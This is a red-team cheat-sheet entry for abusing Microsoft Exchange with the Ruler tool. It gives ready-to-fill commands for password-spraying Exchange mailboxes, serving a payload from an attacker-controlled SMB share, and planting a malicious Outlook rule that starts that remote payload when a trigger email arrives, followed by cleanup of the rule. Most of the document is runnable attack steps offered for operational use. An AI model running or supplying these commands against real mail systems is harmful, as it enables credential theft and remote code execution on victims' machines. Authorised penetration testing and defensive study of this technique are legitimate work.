---
technique: Ruler Mail Rule Abuse
category: exchange
targets: Exchange, Outlook
protocols: HTTPS, EWS, MAPI, SMB
remote_capable: true
tags: exchange ruler outlook mail-rule initial-access execution ad
---

# Ruler Mail Rule Abuse

Ruler can authenticate to Exchange and create client-side Outlook rules for a compromised mailbox. If the victim opens Outlook and the rule triggers, Outlook can start a payload from a reachable path such as an SMB share.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Valid mailbox credentials | Ruler needs an account that can authenticate to Exchange |
| Outlook client path | The rule executes when the mailbox is processed by Outlook |
| Payload hosting | The payload location must be reachable from the victim workstation |
| Egress path | Reverse payloads need a reachable callback path |

## Windows

No Windows operator command is included here. The local repos confirm the Ruler workflow from Linux.

## Linux

### Password spray Exchange

#ruler #spray

Spray a user list against Exchange to identify valid mailbox credentials.

```sh title:"Password spray Exchange with Ruler"
ruler -k --domain "$domain" brute --users "$user_file" --passwords "$password_file" --verbose
```
<!-- cheat
import domain_ip
var user_file
var password_file
-->

### Display existing rules

#ruler #recon

List existing mailbox rules to confirm access and avoid clobbering an existing rule name.

```sh title:"Display Exchange mailbox rules with Ruler"
ruler -k --verbose --email "$email" --username "$user" -p "$pass" display
```
<!-- cheat
import users
import passwords
var email
-->

### Host payload over SMB

#impacket #smb

Serve the payload directory over SMB so the Outlook client can retrieve the executable.

```sh title:"Serve Outlook rule payload over SMB"
smbserver.py "$share" "$payload_dir"
```
<!-- cheat
var share
var payload_dir
-->

### Add malicious mail rule

#ruler #mail-rule #execution

Create a rule that starts a hosted payload when a matching message arrives.

```sh title:"Create Outlook start rule with Ruler"
ruler -k --verbose --email "$email" --username "$user" -p "$pass" add --location "\\\\$lhost\\$share\\$payload_file" --trigger "$trigger_word" --name "$rule_name" --send --subject "$trigger_word"
```
<!-- cheat
import users
import passwords
var email
var lhost
var share
var payload_file
var trigger_word
var rule_name
-->

### Delete mail rule

#ruler #cleanup

Remove the rule after validation or operation completion.

```sh title:"Delete Outlook rule with Ruler"
ruler -k --verbose --email "$email" --username "$user" -p "$pass" delete --name "$rule_name"
```
<!-- cheat
import users
import passwords
var email
var rule_name
-->
